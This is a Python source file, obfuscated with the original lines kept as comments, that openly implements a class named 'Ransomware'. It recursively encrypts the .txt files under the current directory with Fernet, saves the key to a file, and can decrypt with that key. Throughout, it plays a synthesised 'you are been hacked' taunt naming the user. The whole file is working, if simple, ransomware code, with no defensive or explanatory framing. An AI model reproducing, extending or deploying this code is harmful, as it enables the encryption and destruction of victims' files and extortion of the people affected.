import os #line:3:import os
from os .path import expanduser #line:4:from os.path import expanduser
from cryptography .fernet import Fernet #line:5:from cryptography.fernet import Fernet
import base64 #line:6:import base64
import platform #line:7:import platform
import sys #line:8:import sys
from gtts import gTTS #line:9:from gtts import gTTS
import getpass #line:10:import getpass
language ='en'#line:13:language = 'en'
process1 =("ahha you are been hacked, say good by on your pc."+getpass .getuser ())#line:15:process1 = ("ahha you are been hacked, say good by on your pc." + getpass.getuser())
output =gTTS (text =process1 ,lang =language ,slow =False )#line:16:output = gTTS(text=process1, lang=language, slow=False)
output .save ("process1.mp3")#line:17:output.save("process1.mp3")
class Ransomware :#line:19:class Ransomware:
    def __init__ (O0OOO0OO000OO0OOO ,OO0O000OOOOOO0O0O =None ):#line:21:def __init__(self, key=None):
        O0OOO0OO000OO0OOO .key =OO0O000OOOOOO0O0O #line:23:self.key = key
        O0OOO0OO000OO0OOO .cryptor =None #line:24:self.cryptor = None
        O0OOO0OO000OO0OOO .file_ext_targets =['txt']#line:25:self.file_ext_targets = ['txt']
    def generate_key (O0OO00OO0OOO00O00 ):#line:28:def generate_key(self):
        O0OO00OO0OOO00O00 .key =Fernet .generate_key ()#line:30:self.key = Fernet.generate_key()
        O0OO00OO0OOO00O00 .cryptor =Fernet (O0OO00OO0OOO00O00 .key )#line:31:self.cryptor = Fernet(self.key)
        if platform .system ()=="Windows":#line:32:if platform.system() == "Windows":
            os .system ('start process1.mp3')#line:33:os.system('start process1.mp3')
        if platform .system ()=="Linux":#line:34:if platform.system() == "Linux":
            os .system ('nohup play process1.mp3')#line:35:os.system('nohup play process1.mp3')
    def read_key (O0OOOO0OOO00OO000 ,OO0O0O0OO000OO000 ):#line:38:def read_key(self, keyfile_name):
        with open (OO0O0O0OO000OO000 ,'rb')as O00O0O00000OO0O00 :#line:40:with open(keyfile_name, 'rb') as f:
            O0OOOO0OOO00OO000 .key =O00O0O00000OO0O00 .read ()#line:41:self.key = f.read()
            O0OOOO0OOO00OO000 .cryptor =Fernet (O0OOOO0OOO00OO000 .key )#line:42:self.cryptor = Fernet(self.key)
            if platform .system ()=="Windows":#line:43:if platform.system() == "Windows":
                os .system ('start process1.mp3')#line:44:os.system('start process1.mp3')
            if platform .system ()=="Linux":#line:45:if platform.system() == "Linux":
                os .system ('nohup play process1.mp3')#line:46:os.system('nohup play process1.mp3')
    def write_key (OOOO0OOO0O0OOOOO0 ,O000OOOOO0O0OO00O ):#line:49:def write_key(self, keyfile_name):
        print (OOOO0OOO0O0OOOOO0 .key )#line:51:print(self.key)
        with open (O000OOOOO0O0OO00O ,'wb')as OO00OOO0OO0O00000 :#line:52:with open(keyfile_name, 'wb') as f:
            OO00OOO0OO0O00000 .write (OOOO0OOO0O0OOOOO0 .key )#line:53:f.write(self.key)
            if platform .system ()=="Windows":#line:54:if platform.system() == "Windows":
                os .system ('start process1.mp3')#line:55:os.system('start process1.mp3')
            if platform .system ()=="Linux":#line:56:if platform.system() == "Linux":
                os .system ('nohup play process1.mp3')#line:57:os.system('nohup play process1.mp3')
    def crypt_root (OO0O000OOOO0O00OO ,O000000OO0OO00000 ,OO00OOOO0OOO000OO =False ):#line:60:def crypt_root(self, root_dir, encrypted=False):
        for O000O0000OOO00O0O ,_O000OO000OO0OO000 ,O0O00O0OOOOOOO0OO in os .walk (O000000OO0OO00000 ):#line:63:for root, _, files in os.walk(root_dir):
            for OO0OO0OO00OOO0O00 in O0O00O0OOOOOOO0OO :#line:64:for f in files:
                OOO0OOO0O00OO0OO0 =os .path .join (O000O0000OOO00O0O ,OO0OO0OO00OOO0O00 )#line:65:abs_file_path = os.path.join(root, f)
                if platform .system ()=="Windows":#line:66:if platform.system() == "Windows":
                    os .system ('start process1.mp3')#line:67:os.system('start process1.mp3')
                if platform .system ()=="Linux":#line:68:if platform.system() == "Linux":
                    os .system ('nohup play process1.mp3')#line:69:os.system('nohup play process1.mp3')
                if not OOO0OOO0O00OO0OO0 .split ('.')[-1 ]in OO0O000OOOO0O00OO .file_ext_targets :#line:73:if not abs_file_path.split('.')[-1] in self.file_ext_targets:
                    continue #line:74:continue
                OO0O000OOOO0O00OO .crypt_file (OOO0OOO0O00OO0OO0 ,encrypted =OO00OOOO0OOO000OO )#line:76:self.crypt_file(abs_file_path, encrypted=encrypted)
    def crypt_file (O000O000OO0O00OOO ,OO0O00O00OO00OOOO ,O0O0O0OOOO000OO0O =False ):#line:80:def crypt_file(self, file_path, encrypted=False):
        with open (OO0O00O00OO00OOOO ,'rb+')as OOOOO0O0000OOO0OO :#line:83:with open(file_path, 'rb+') as f:
            _O00O0OO0O00OO0000 =OOOOO0O0000OOO0OO .read ()#line:84:_data = f.read()
            if not O0O0O0OOOO000OO0O :#line:86:if not encrypted:
                print (f'File contents pre encryption: {_O00O0OO0O00OO0000}')#line:87:print(f'File contents pre encryption: {_data}')
                OO00O0O00OOOO0O0O =O000O000OO0O00OOO .cryptor .encrypt (_O00O0OO0O00OO0000 )#line:88:data = self.cryptor.encrypt(_data)
                print (f'File contents post encryption: {OO00O0O00OOOO0O0O}')#line:89:print(f'File contents post encryption: {data}')
            else :#line:90:else:
                OO00O0O00OOOO0O0O =O000O000OO0O00OOO .cryptor .decrypt (_O00O0OO0O00OO0000 )#line:91:data = self.cryptor.decrypt(_data)
                print (f'File content post decryption: {OO00O0O00OOOO0O0O}')#line:92:print(f'File content post decryption: {data}')
            OOOOO0O0000OOO0OO .seek (0 )#line:94:f.seek(0)
            OOOOO0O0000OOO0OO .write (OO00O0O00OOOO0O0O )#line:95:f.write(data)
if __name__ =='__main__':#line:98:if __name__ == '__main__':
    local_root ='.'#line:100:local_root = '.'
    import argparse #line:104:import argparse
    parser =argparse .ArgumentParser ()#line:105:parser = argparse.ArgumentParser()
    parser .add_argument ('--action',required =True )#line:106:parser.add_argument('--action', required=True)
    parser .add_argument ('--keyfile')#line:107:parser.add_argument('--keyfile')
    args =parser .parse_args ()#line:109:args = parser.parse_args()
    action =args .action .lower ()#line:110:action = args.action.lower()
    keyfile =args .keyfile #line:111:keyfile = args.keyfile
    rware =Ransomware ()#line:113:rware = Ransomware()
    if action =='decrypt':#line:115:if action == 'decrypt':
        if keyfile is None :#line:116:if keyfile is None:
            print ('Path to keyfile must be specified after --keyfile to perform decryption.')#line:117:print('Path to keyfile must be specified after --keyfile to perform decryption.')
        else :#line:118:else:
            rware .read_key (keyfile )#line:119:rware.read_key(keyfile)
            rware .crypt_root (local_root ,encrypted =True )#line:120:rware.crypt_root(local_root, encrypted=True)
    elif action =='encrypt':#line:121:elif action == 'encrypt':
        rware .generate_key ()#line:122:rware.generate_key()
        rware .write_key ('keyfile')#line:123:rware.write_key('keyfile')
        rware .crypt_root (local_root )#line:124:rware.crypt_root(local_root)
        if platform .system ()=="Windows":#line:125:if platform.system() == "Windows":
            os .system ('start process1.mp3')#line:126:os.system('start process1.mp3')
        if platform .system ()=="Linux":#line:127:if platform.system() == "Linux":
            os .system ('nohup play process1.mp3')
